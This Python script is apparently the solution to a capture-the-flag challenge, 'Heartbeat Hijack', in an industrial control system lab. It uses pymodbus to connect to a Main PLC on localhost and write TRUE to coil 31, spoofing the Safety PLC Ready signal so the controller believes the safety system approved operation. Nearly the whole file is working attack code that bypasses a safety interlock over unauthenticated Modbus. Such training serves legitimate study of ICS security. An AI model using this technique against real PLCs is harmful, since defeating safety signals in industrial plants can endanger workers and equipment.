#!/usr/bin/env python3
"""
Challenge 08: Heartbeat Hijack (350 points)
Difficulty: Medium

Objective: Spoof the Safety PLC Ready signal (Coil 31) to make the Main PLC
think Safety has approved operation when it has not.

Requirements:
- Write TRUE to safety_plc_ready via Modbus (coil 31)
- Signal must be spoofed via external Modbus write

Educational Value:
- Learn about PLC heartbeat signals
- Understand inter-PLC communication
- Practice signal spoofing attacks
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
MAIN_PLC_PORT = 502

def spoof_safety_heartbeat():
    """
    Spoof the Safety PLC Ready signal
    """
    print("=" * 60)
    print("Challenge 08: Heartbeat Hijack")
    print("=" * 60)
    print()

    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)

    if not client.connect():
        print("✗ Failed to connect to Main PLC")
        return False

    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
    print()

    # Read current safety heartbeat status
    result = client.read_coils(31, 1, slave=1)
    if result.isError():
        print("✗ Failed to read safety heartbeat")
        client.close()
        return False

    current_status = result.bits[0]
    print(f"Current Safety PLC Ready Status: {current_status}")
    print()

    print("About to spoof Safety PLC Ready signal...")
    print("This makes the Main PLC believe Safety PLC has validated operation.")
    print()

    # First set it to FALSE to show the manipulation
    print("Step 1: Setting signal to FALSE...")
    result = client.write_coil(31, False, slave=1)
    if result.isError():
        print("✗ Failed to write coil")
        client.close()
        return False
    print("  ✓ Signal set to FALSE")
    time.sleep(1)

    # Now set it to TRUE (spoofing safety approval)
    print()
    print("Step 2: Spoofing Safety PLC Ready signal to TRUE...")
    result = client.write_coil(31, True, slave=1)
    if not result.isError():
        print("  ✓ Safety heartbeat spoofed!")
        print()
        print("⚠️  Main PLC now believes Safety PLC has validated operation!")
        print("   This bypasses the distributed safety architecture.")
        print()
        print("🎯 Challenge 08 should now be completed!")
        print("   Check the CTF dashboard to verify.")

        # Verify the write
        time.sleep(0.5)
        result = client.read_coils(31, 1, slave=1)
        if not result.isError():
            new_status = result.bits[0]
            print()
            print(f"Verified Safety PLC Ready Status: {new_status}")

        client.close()
        return True
    else:
        print("  ✗ Failed to write coil")
        client.close()
        return False

if __name__ == "__main__":
    try:
        spoof_safety_heartbeat()
    except KeyboardInterrupt:
        print("\n\n✗ Attack interrupted by user")
    except Exception as e:
        print(f"\n✗ Attack failed: {e}")
